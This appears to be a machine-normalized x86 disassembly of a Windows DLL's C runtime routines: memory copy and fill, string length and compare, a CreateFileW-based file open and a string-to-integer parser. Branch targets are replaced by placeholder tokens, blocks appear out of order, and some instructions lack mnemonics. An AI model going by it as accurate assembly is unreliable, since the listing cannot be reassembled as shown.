mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10078770 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007890c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078770 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078770 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078770 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007890c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007890c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007890c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10078970
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10037225
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_100789ea
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_1004c3b6
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000c53b
add esp 0x20
pop esi
pop ebp
retn
sub_10078a1d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_1004c3b6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000c53b
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1004e4ec
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1002f2a3
pop ebx
leave
retn
sub_10078ac0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10078b50
push sub_10009180
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10078ba9
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_1004a8fe
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_10078bd8
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_10078ba9
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_10078ba9
pop ecx
sub_10078c40
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10078cc8
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10039ce0
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_1003c242
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_1003c242
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_10023aaa
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_1003c242
and [ eax ] 0x0
mov [ esi ] ebx
call sub_10012991
mov [ eax ] 0x18
call sub_10012991
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_100249b4
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_100249b4
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_10012991
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_10012991
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_10040843
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_10067466
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
and [ ebp - 0x28 ] 0x0
push 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ esi ]
call sub_1001401c
add esp 0xc
test eax eax
jne r-xdata
call sub_1003c242
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_10067466
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1a
jne r-xdata
push [ esi ]
call sub_10049551
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_100249b4
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_10060de1
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_1001c150
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_1001401c
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_1005905c
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_1005905c
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_10049551
pop ecx
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_10067466
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_10055977
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_10067466
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_1005905c
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_1005905c
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_100793fd
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_100036b3
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10079430
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_100793fd
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_100793fd
sub_100794a0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_100794cb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_1000906c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_1002d975
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_1002d975
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_10012991
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_1002d975
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
